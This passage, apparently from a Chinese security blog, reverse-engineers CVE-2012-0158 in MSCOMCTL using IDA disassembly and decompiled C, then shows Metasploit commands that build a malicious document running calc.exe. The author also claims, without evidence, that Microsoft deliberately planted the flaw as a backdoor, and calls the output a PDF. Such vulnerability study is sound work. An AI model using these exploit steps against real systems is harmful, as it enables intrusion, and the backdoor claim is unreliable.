class="line">.text:275C8914 39 7D FC                      cmp     [ebp+var_4], edi</span><br><span class="line">.text:275C8917 0F 85 BE B4 00 00             jnz     loc_275D3DDB</span><br><span class="line">.text:275C8917</span><br><span class="line">.text:275C891D 57                            push    edi                             ; dwBytes</span><br><span class="line">.text:275C891E 56                            push    esi                             ; dwFlags</span><br><span class="line">.text:275C891F FF 35 50 ED 62 27             push    ?g_hHeap@@3PAXA                 ; hHeap</span><br><span class="line">.text:275C8925 FF 15 68 11 58 27             call    ds:__imp__HeapAlloc@12          ; HeapAlloc(x,x,x)</span><br><span class="line">.text:275C8925</span><br><span class="line">.text:275C892B 3B C6                         cmp     eax, esi</span><br><span class="line">.text:275C892D 89 45 0C                      mov     [ebp+lpMem], eax</span><br><span class="line">.text:275C8930 0F 84 AF B4 00 00             jz      loc_275D3DE5</span><br><span class="line">.text:275C8930</span><br><span class="line">.text:275C8936 8B 0B                         mov     ecx, [ebx]</span><br><span class="line">.text:275C8938 56                            push    esi</span><br><span class="line">.text:275C8939 57                            push    edi</span><br><span class="line">.text:275C893A 50                            push    eax</span><br><span class="line">.text:275C893B 53                            push    ebx</span><br><span class="line">.text:275C893C FF 51 0C                      call    dword ptr [ecx+0Ch]</span><br><span class="line">.text:275C893C</span><br><span class="line">.text:275C893F 8B F0                         mov     esi, eax</span><br><span class="line">.text:275C8941 85 F6                         test    esi, esi</span><br><span class="line">.text:275C8943 7C 31                         jl      short loc_275C8976</span><br><span class="line">.text:275C8943</span><br><span class="line">.text:275C8945 8B 75 0C                      mov     esi, [ebp+lpMem]</span><br><span class="line">.text:275C8948 8B CF                         mov     ecx, edi</span><br><span class="line">.text:275C894A 8B 7D 08                      mov     edi, [ebp+arg_0]</span><br><span class="line">.text:275C894D 8B C1                         mov     eax, ecx</span><br><span class="line">.text:275C894F C1 E9 02                      shr     ecx, 2</span><br><span class="line">.text:275C8952 F3 A5                         rep movsd</span><br><span class="line">.text:275C8954 8B C8                         mov     ecx, eax</span><br><span class="line">.text:275C8956 8B 45 10                      mov     eax, [ebp+dwBytes]</span><br><span class="line">.text:275C8959 83 E1 03                      and     ecx, 3</span><br><span class="line">.text:275C895C 6A 00                         push    0</span><br><span class="line">.text:275C895E 8D 50 03                      lea     edx, [eax+3]</span><br><span class="line">.text:275C8961 83 E2 FC                      and     edx, 0FFFFFFFCh</span><br><span class="line">.text:275C8964 2B D0                         sub     edx, eax</span><br><span class="line">.text:275C8966 F3 A4                         rep movsb</span><br><span class="line">.text:275C8968 8B 0B                         mov     ecx, [ebx]</span><br><span class="line">.text:275C896A 52                            push    edx</span><br><span class="line">.text:275C896B 68 78 3F 63 27                push    offset ?PADBYTESBUFFER@@3_JA    ; __int64 PADBYTESBUFFER</span><br><span class="line">.text:275C8970 53                            push    ebx</span><br><span class="line">.text:275C8971 FF 51 0C                      call    dword ptr [ecx+0Ch]</span><br><span class="line">.text:275C8971</span><br><span class="line">.text:275C8974 8B F0                         mov     esi, eax</span><br><span class="line">.text:275C8974</span><br><span class="line">.text:275C8976</span><br><span class="line">.text:275C8976                               loc_275C8976:                           ; CODE XREF: ReadBytesFromStreamPadded(char *,IStream *,ulong)+4F↑j</span><br><span class="line">.text:275C8976 FF 75 0C                      push    [ebp+lpMem]                     ; lpMem</span><br><span class="line">.text:275C8979 6A 00                         push    0                               ; dwFlags</span><br><span class="line">.text:275C897B FF 35 50 ED 62 27             push    ?g_hHeap@@3PAXA                 ; hHeap</span><br><span class="line">.text:275C8981 FF 15 74 11 58 27             call    ds:__imp__HeapFree@12           ; HeapFree(x,x,x)</span><br><span class="line">.text:275C8981</span><br><span class="line">.text:275C8987 8B C6                         mov     eax, esi</span><br><span class="line">.text:275C8987</span><br><span class="line">.text:275C8989</span><br><span class="line">.text:275C8989                               loc_275C8989:                           ; CODE XREF: ReadBytesFromStreamPadded(char *,IStream *,ulong)+1B↑j</span><br><span class="line">.text:275C8989                                                                       ; ReadBytesFromStreamPadded(char *,IStream *,ulong)+B4EC↓j</span><br><span class="line">.text:275C8989                                                                       ; ReadBytesFromStreamPadded(char *,IStream *,ulong)+B4F6↓j</span><br><span class="line">.text:275C8989 5F                            pop     edi</span><br><span class="line">.text:275C898A 5E                            pop     esi</span><br><span class="line">.text:275C898B 5B                            pop     ebx</span><br><span class="line">.text:275C898C C9                            leave</span><br><span class="line">.text:275C898D C3                            retn</span><br><span class="line">.text:275C898D</span><br><span class="line">.text:275C898D                               ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z endp</span><br></pre></td></tr></table></figure></div>

<p>反编译得到</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __cdecl <span class="title function_">ReadBytesFromStreamPadded</span><span class="params">(<span class="type">char</span> *a1, <span class="keyword">struct</span> IStream *lpMem, SIZE_T dwBytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  HRESULT result; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">IStream</span> *<span class="title">v5</span>;</span> <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+Ch] [ebp-4h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">IStream</span> *<span class="title">lpMema</span>;</span> <span class="comment">// [esp+1Ch] [ebp+Ch]</span></span><br><span class="line"></span><br><span class="line">  result = lpMem-&gt;lpVtbl-&gt;Read(lpMem, &amp;v7, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == dwBytes )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">struct</span> IStream *)HeapAlloc(g_hHeap, <span class="number">0</span>, dwBytes);</span><br><span class="line">      lpMema = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = lpMem-&gt;lpVtbl-&gt;Read(lpMem, v5, dwBytes, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy(a1, lpMema, dwBytes);</span><br><span class="line">          v6 = lpMem-&gt;lpVtbl-&gt;Read(lpMem, &amp;PADBYTESBUFFER, ((dwBytes + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - dwBytes, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        HeapFree(g_hHeap, <span class="number">0</span>, lpMema);</span><br><span class="line">        <span class="keyword">return</span> v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-2147024882</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-2147418113</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们注意到 <code>ReadBytesFromStreamPadded</code> 函数实际上是一个类似 <code>memcpy</code> 的内存拷贝函数。它的功能是根据参数从指定内存拷贝指定大小数据到目标内存。因此漏洞应该出现在其主调函数中，而栈溢出时，其主调函数为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">.text:275C8B4E                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:275C8B4E</span><br><span class="line">.text:275C8B4E                               ; Attributes: bp-based frame</span><br><span class="line">.text:275C8B4E</span><br><span class="line">.text:275C8B4E                               ; int __stdcall CObj::Load(CObj *this, struct IStream *bstrString)</span><br><span class="line">.text:275C8B4E                               public ?Load@CObj@@MAGJPAUIStream@@@Z</span><br><span class="line">.text:275C8B4E                               ?Load@CObj@@MAGJPAUIStream@@@Z proc near</span><br><span class="line">.text:275C8B4E                                                                       ; CODE XREF: CNode::Load(IStream *)+10↑p</span><br><span class="line">.text:275C8B4E                                                                       ; CListItem::Load(IStream *)+11↓p</span><br><span class="line">.text:275C8B4E                                                                       ; CListSubItem::Load(IStream *)+11↓p</span><br><span class="line">.text:275C8B4E                                                                       ; DATA XREF: .text:2758340C↑o</span><br><span class="line">.text:275C8B4E                                                                       ; .text:275B0504↑o</span><br><span class="line">.text:275C8B4E                                                                       ; .text:275E4C74↓o</span><br><span class="line">.text:275C8B4E</span><br><span class="line">.text:275C8B4E                               var_14= byte ptr -14h</span><br><span class="line">.text:275C8B4E                               dwBytes= dword ptr -0Ch</span><br><span class="line">.text:275C8B4E                               var_8= byte ptr -8</span><br><span class="line">.text:275C8B4E                               var_4= dword ptr -4</span><br><span class="line">.text:275C8B4E                               this= dword ptr  8</span><br><span class="line">.text:275C8B4E                               bstrString= dword ptr  0Ch</span><br><span class="line">.text:275C8B4E</span><br><span class="line">.text:275C8B4E                               ; FUNCTION CHUNK AT .text:275D2E73 SIZE 0000001D BYTES</span><br><span class="line">.text:275C8B4E</span><br><span class="line">.text:275C8B4E 55                            push    ebp</span><br><span class="line">.text:275C8B4F 8B EC                         mov     ebp, esp</span><br><span class="line">.text:275C8B51 83 EC 14                      sub     esp, 14h</span><br><span class="line">.text:275C8B54 53                            push    ebx</span><br><span class="line">.text:275C8B55 8B 5D 0C                      mov     ebx, [ebp+bstrString]</span><br><span class="line">.text:275C8B58 56                            push    esi</span><br><span class="line">.text:275C8B59 57                            push    edi</span><br><span class="line">.text:275C8B5A 6A 0C                         push    0Ch                             ; dwBytes</span><br><span class="line">.text:275C8B5C 8D 45 EC                      lea     eax, [ebp+var_14]</span><br><span class="line">.text:275C8B5F 53                            push    ebx                             ; lpMem</span><br><span class="line">.text:275C8B60 50                            push    eax                             ; char *</span><br><span class="line">.text:275C8B61 E8 8E FD FF FF                call    ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z ; ReadBytesFromStreamPadded(char *,IStream *,ulong)</span><br><span class="line">.text:275C8B61</span><br><span class="line">.text:275C8B66 83 C4 0C                      add     esp, 0Ch</span><br><span class="line">.text:275C8B69 85 C0                         test    eax, eax</span><br><span class="line">.text:275C8B6B 7C 6C                         jl      short loc_275C8BD9</span><br><span class="line">.text:275C8B6B</span><br><span class="line">.text:275C8B6D 81 7D EC 43 6F 62 6A          cmp     dword ptr [ebp+var_14], 6A626F43h</span><br><span class="line">.text:275C8B74 0F 85 F9 A2 00 00             jnz     loc_275D2E73</span><br><span class="line">.text:275C8B74</span><br><span class="line">.text:275C8B7A 83 7D F4 08                   cmp     [ebp+dwBytes], 8</span><br><span class="line">.text:275C8B7E 0F 82 EF A2 00 00             jb      loc_275D2E73</span><br><span class="line">.text:275C8B7E</span><br><span class="line">.text:275C8B84 FF 75 F4                      push    [ebp+dwBytes]                   ; dwBytes</span><br><span class="line">.text:275C8B87 8D 45 F8                      lea     eax, [ebp+var_8]</span><br><span class="line">.text:275C8B8A 53                            push    ebx                             ; lpMem</span><br><span class="line">.text:275C8B8B 50                            push    eax                             ; char *</span><br><span class="line">.text:275C8B8C E8 63 FD FF FF                call    ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z ; ReadBytesFromStreamPadded(char *,IStream *,ulong)</span><br><span class="line">.text:275C8B8C</span><br><span class="line">.text:275C8B91 8B F0                         mov     esi, eax</span><br><span class="line">.text:275C8B93 83 C4 0C                      add     esp, 0Ch</span><br><span class="line">.text:275C8B96 85 F6                         test    esi, esi</span><br><span class="line">.text:275C8B98 7C 3D                         jl      short loc_275C8BD7</span><br><span class="line">.text:275C8B98</span><br><span class="line">.text:275C8B9A 83 7D F8 00                   cmp     dword ptr [ebp+var_8], 0</span><br><span class="line">.text:275C8B9E 8B 7D 08                      mov     edi, [ebp+this]</span><br><span class="line">.text:275C8BA1 74 2A                         jz      short loc_275C8BCD</span><br><span class="line">.text:275C8BA1</span><br><span class="line">.text:275C8BA3 83 65 0C 00                   and     [ebp+bstrString], 0</span><br><span class="line">.text:275C8BA7 8D 45 0C                      lea     eax, [ebp+bstrString]</span><br><span class="line">.text:275C8BAA 53                            push    ebx                             ; struct IStream *</span><br><span class="line">.text:275C8BAB 50                            push    eax                             ; len</span><br><span class="line">.text:275C8BAC E8 2F 00 00 00                call    ?ReadBstrFromStreamPadded@@YAJAAPAGPAUIStream@@@Z ; ReadBstrFromStreamPadded(ushort * &amp;,IStream *)</span><br><span class="line">.text:275C8BAC</span><br><span class="line">.text:275C8BB1 8B F0                         mov     esi, eax</span><br><span class="line">.text:275C8BB3 59                            pop     ecx</span><br><span class="line">.text:275C8BB4 85 F6                         test    esi, esi</span><br><span class="line">.text:275C8BB6 59                            pop     ecx</span><br><span class="line">.text:275C8BB7 7C 1E                         jl      short loc_275C8BD7</span><br><span class="line">.text:275C8BB7</span><br><span class="line">.text:275C8BB9 FF 75 0C                      push    [ebp+bstrString]                ; pbstr</span><br><span class="line">.text:275C8BBC 8D 4F DC                      lea     ecx, [edi-24h]                  ; this</span><br><span class="line">.text:275C8BBF E8 F4 2D FC FF                call    ?SetKey@CObj@@QAEJPAG@Z         ; CObj::SetKey(ushort *)</span><br><span class="line">.text:275C8BBF</span><br><span class="line">.text:275C8BC4 FF 75 0C                      push    [ebp+bstrString]                ; bstrString</span><br><span class="line">.text:275C8BC7 FF 15 40 15 58 27             call    ds:__imp__SysFreeString@4       ; SysFreeString(x)</span><br><span class="line">.text:275C8BC7</span><br><span class="line">.text:275C8BCD</span><br><span class="line">.text:275C8BCD                               loc_275C8BCD:                           ; CODE XREF: CObj::Load(IStream *)+53↑j</span><br><span class="line">.text:275C8BCD 83 7D FC 00                   cmp     [ebp+var_4], 0</span><br><span class="line">.text:275C8BD1 0F 85 A6 A2 00 00             jnz     loc_275D2E7D</span><br><span class="line">.text:275C8BD1</span><br><span class="line">.text:275C8BD7</span><br><span class="line">.text:275C8BD7                               loc_275C8BD7:                           ; CODE XREF: CObj::Load(IStream *)+4A↑j</span><br><span class="line">.text:275C8BD7                                                                       ; CObj::Load(IStream *)+69↑j</span><br><span class="line">.text:275C8BD7                                                                       ; CObj::Load(IStream *)+A33D↓j</span><br><span class="line">.text:275C8BD7 8B C6                         mov     eax, esi</span><br><span class="line">.text:275C8BD7</span><br><span class="line">.text:275C8BD9</span><br><span class="line">.text:275C8BD9                               loc_275C8BD9:                           ; CODE XREF: CObj::Load(IStream *)+1D↑j</span><br><span class="line">.text:275C8BD9                                                                       ; CObj::Load(IStream *)+A32A↓j</span><br><span class="line">.text:275C8BD9 5F                            pop     edi</span><br><span class="line">.text:275C8BDA 5E                            pop     esi</span><br><span class="line">.text:275C8BDB 5B                            pop     ebx</span><br><span class="line">.text:275C8BDC C9                            leave</span><br><span class="line">.text:275C8BDD C2 08 00                      retn    8</span><br><span class="line">.text:275C8BDD</span><br><span class="line">.text:275C8BDD                               ?Load@CObj@@MAGJPAUIStream@@@Z endp</span><br><span class="line">.text:275C8BDD</span><br></pre></td></tr></table></figure></div>

<p>反编译得到</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __stdcall <span class="title function_">CObj::Load</span><span class="params">(CObj *this, <span class="keyword">struct</span> IStream *bstrString)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">IStream</span> *<span class="title">v2</span>;</span> <span class="comment">// ebx</span></span><br><span class="line">  HRESULT result; <span class="comment">// eax</span></span><br><span class="line">  HRESULT BytesFromStreamPadded; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">4</span>]; <span class="comment">// [esp+Ch] [ebp-14h] BYREF</span></span><br><span class="line">  SIZE_T dwBytes; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = bstrString;</span><br><span class="line">  result = ReadBytesFromStreamPadded(v5, bstrString, <span class="number">0xCu</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != <span class="string">&#x27;jboC&#x27;</span> || dwBytes &lt; <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-2147418113</span>;</span><br><span class="line">    BytesFromStreamPadded = ReadBytesFromStreamPadded(v7, v2, dwBytes);</span><br><span class="line">    <span class="keyword">if</span> ( BytesFromStreamPadded &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> BytesFromStreamPadded;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      bstrString = <span class="number">0</span>;</span><br><span class="line">      BytesFromStreamPadded = ReadBstrFromStreamPadded((UINT)&amp;bstrString, v2);</span><br><span class="line">      <span class="keyword">if</span> ( BytesFromStreamPadded &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> BytesFromStreamPadded;</span><br><span class="line">      CObj::SetKey((CObj *)((<span class="type">char</span> *)this - <span class="number">36</span>), (BSTR)bstrString);</span><br><span class="line">      SysFreeString((BSTR)bstrString);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      <span class="keyword">return</span> ReadVariantFromStream((<span class="keyword">struct</span> tagVARIANT *)((<span class="type">char</span> *)this + <span class="number">20</span>), v2);</span><br><span class="line">    <span class="keyword">return</span> BytesFromStreamPadded;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数是 CObj 对象的加载方法，会先从数据流中读取 0xC 个字节到内存中，并检查其中的前四个字节是否为 Cobj 与同时被读入的 dwBytes 是否大于等于 8 。检查通过后将直接根据 dwBytes 的值进行对应大小的内存复制，复制的源地址为函数参数 bstrString</p>
<p>太抽象了这个漏洞，按照补丁来看正常的 dwBytes 值应该刚好等于 8，但这里的判错条件却并非 dwBytes !&#x3D; 8 而是 dwBytes &lt; 8，以及内存复制目标 v7 的地址恰好是 ebp-8h，只要 dwBytes 的值大于 8 便必然且刚好地栈溢出。结合本漏洞初次被发现于针对东南亚国家和地区的间谍活动网络攻击事件中，很难不怀疑这是微软故意留下的后门</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 MSF 搜索该漏洞的 exp</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; search cve-2012-0158</span><br></pre></td></tr></table></figure></div>

<p>搜索结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                                                                Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                                                                                ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/fileformat/ms12_027_mscomctl_bof                                                    2012-04-10       average  No     MS12-027 MSCOMCTL ActiveX Buffer Overflow</span><br><span class="line">   1    \_ target: Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English  .                .        .      .</span><br><span class="line">   2    \_ target: Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English                  .                .        .      .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/fileformat/ms12_027_mscomctl_bof</span><br><span class="line">After interacting with a module you can manually set a TARGET with set TARGET &#x27;Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English&#x27;</span><br></pre></td></tr></table></figure></div>

<p>调用该模块并查看模块详情</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/fileformat/ms12_027_mscomctl_bof</span><br><span class="line">msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; info</span><br></pre></td></tr></table></figure></div>

<p>模块详情信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">       Name: MS12-027 MSCOMCTL ActiveX Buffer Overflow</span><br><span class="line">     Module: exploit/windows/fileformat/ms12_027_mscomctl_bof</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch:</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Average</span><br><span class="line">  Disclosed: 2012-04-10</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Unknown</span><br><span class="line">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">      Id  Name</span><br><span class="line">      --  ----</span><br><span class="line">  =&gt;  0   Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English</span><br><span class="line">      1   Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  FILENAME  msf.doc          yes       The file name.</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 900</span><br><span class="line">  Avoid: 1 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious</span><br><span class="line">  RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited</span><br><span class="line">  in the wild on April 2012.</span><br><span class="line"></span><br><span class="line">  This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office</span><br><span class="line">  2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses</span><br><span class="line">  &quot;msgr3en.dll&quot;, which will load after office got load, so the malicious file must</span><br><span class="line">  be loaded through &quot;File / Open&quot; to achieve exploitation.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2012-0158</span><br><span class="line">  OSVDB (81125)</span><br><span class="line">  http://www.securityfocus.com/bid/52911</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-027</span><br><span class="line">  http://contagiodump.blogspot.com.es/2012/04/cve2012-0158-south-china-sea-insider.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info -d command.</span><br></pre></td></tr></table></figure></div>

<p>使用该模块生成木马 PDF 文件</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; <span class="built_in">set</span> FILENAME Crash.pdf</span><br><span class="line">msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; <span class="built_in">set</span> payload windows/exec</span><br><span class="line">msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; exploit</span><br></pre></td></tr></table></figure></div>

